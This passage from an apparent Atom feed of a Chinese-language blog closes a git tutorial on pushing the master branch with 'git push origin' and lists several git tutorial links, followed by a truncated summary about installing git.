xxx第一次推送master分支的所有内容；<br>此后，每次本地提交后，只要有必要，就可以使用命令git push origin xxx推送最新修改；</p><p><a href="https://backlog.com/git-tutorial/cn/" target="_blank" rel="noopener">https://backlog.com/git-tutorial/cn/</a><br><a href="http://www.runoob.com/git/git-tutorial.html" target="_blank" rel="noopener">http://www.runoob.com/git/git-tutorial.html</a><br><a href="https://github.com/xirong/my-git/blob/master/ixirong.com.md" target="_blank" rel="noopener">https://github.com/xirong/my-git/blob/master/ixirong.com.md</a><br><a href="http://www.nafnafa.com/archives/33" target="_blank" rel="noopener">http://www.nafnafa.com/archives/33</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0x00安装git&quot;&gt;&lt;a href=&quot;#0x00安装git&quot; class=&quot;headerlink&quot; title=&quot;0x00安装git&quot;&gt;&lt;/a&gt;0x00安装git&lt;/h1&gt;&lt;p&gt;linux一般自带，windows访问以下链接&lt;a href=&quot;https://gi
      
    
    </summary>
    
    
      <category term="git" scheme="https://threst.github.io/tags/git/"/>
    
  </entry>
  
</feed>
